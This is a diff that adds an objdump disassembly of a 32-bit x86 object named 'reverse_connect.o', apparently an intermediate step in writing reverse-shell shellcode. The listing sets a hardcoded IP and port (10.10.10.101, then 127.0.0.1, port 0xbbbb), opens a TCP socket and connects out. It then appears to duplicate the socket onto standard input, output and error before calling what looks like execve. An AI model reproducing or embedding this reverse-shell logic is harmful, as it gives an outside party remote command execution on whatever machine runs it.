@@ -1,0 +1,64 @@
+
+reverse_connect.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <main>:
+   0:	8d 4c 24 04          	lea    0x4(%esp),%ecx
+   4:	83 e4 f0             	and    $0xfffffff0,%esp
+   7:	ff 71 fc             	pushl  -0x4(%ecx)
+   a:	55                   	push   %ebp
+   b:	89 e5                	mov    %esp,%ebp
+   d:	51                   	push   %ecx
+   e:	83 ec 24             	sub    $0x24,%esp
+  11:	e8 fc ff ff ff       	call   12 <main+0x12>
+  16:	66 c7 45 d8 02 00    	movw   $0x2,-0x28(%ebp)
+  1c:	c7 45 dc 0a 0a 0a 65 	movl   $0x650a0a0a,-0x24(%ebp)
+  23:	c7 45 dc 7f 00 00 01 	movl   $0x100007f,-0x24(%ebp)
+  2a:	66 c7 45 da bb bb    	movw   $0xbbbb,-0x26(%ebp)
+  30:	83 ec 04             	sub    $0x4,%esp
+  33:	6a 00                	push   $0x0
+  35:	6a 01                	push   $0x1
+  37:	6a 02                	push   $0x2
+  39:	e8 fc ff ff ff       	call   3a <main+0x3a>
+  3e:	83 c4 10             	add    $0x10,%esp
+  41:	89 45 f4             	mov    %eax,-0xc(%ebp)
+  44:	83 ec 04             	sub    $0x4,%esp
+  47:	6a 10                	push   $0x10
+  49:	8d 45 d8             	lea    -0x28(%ebp),%eax
+  4c:	50                   	push   %eax
+  4d:	ff 75 f4             	pushl  -0xc(%ebp)
+  50:	e8 fc ff ff ff       	call   51 <main+0x51>
+  55:	83 c4 10             	add    $0x10,%esp
+  58:	89 45 f0             	mov    %eax,-0x10(%ebp)
+  5b:	83 ec 08             	sub    $0x8,%esp
+  5e:	6a 00                	push   $0x0
+  60:	ff 75 f4             	pushl  -0xc(%ebp)
+  63:	e8 fc ff ff ff       	call   64 <main+0x64>
+  68:	83 c4 10             	add    $0x10,%esp
+  6b:	83 ec 08             	sub    $0x8,%esp
+  6e:	6a 01                	push   $0x1
+  70:	ff 75 f4             	pushl  -0xc(%ebp)
+  73:	e8 fc ff ff ff       	call   74 <main+0x74>
+  78:	83 c4 10             	add    $0x10,%esp
+  7b:	83 ec 08             	sub    $0x8,%esp
+  7e:	6a 02                	push   $0x2
+  80:	ff 75 f4             	pushl  -0xc(%ebp)
+  83:	e8 fc ff ff ff       	call   84 <main+0x84>
+  88:	83 c4 10             	add    $0x10,%esp
+  8b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
+  92:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
+  99:	8b 45 e8             	mov    -0x18(%ebp),%eax
+  9c:	83 ec 04             	sub    $0x4,%esp
+  9f:	6a 00                	push   $0x0
+  a1:	8d 55 e8             	lea    -0x18(%ebp),%edx
+  a4:	52                   	push   %edx
+  a5:	50                   	push   %eax
+  a6:	e8 fc ff ff ff       	call   a7 <main+0xa7>
+  ab:	83 c4 10             	add    $0x10,%esp
+  ae:	b8 00 00 00 00       	mov    $0x0,%eax
+  b3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
+  b6:	c9                   	leave  
+  b7:	8d 61 fc             	lea    -0x4(%ecx),%esp
+  ba:	c3                   	ret    
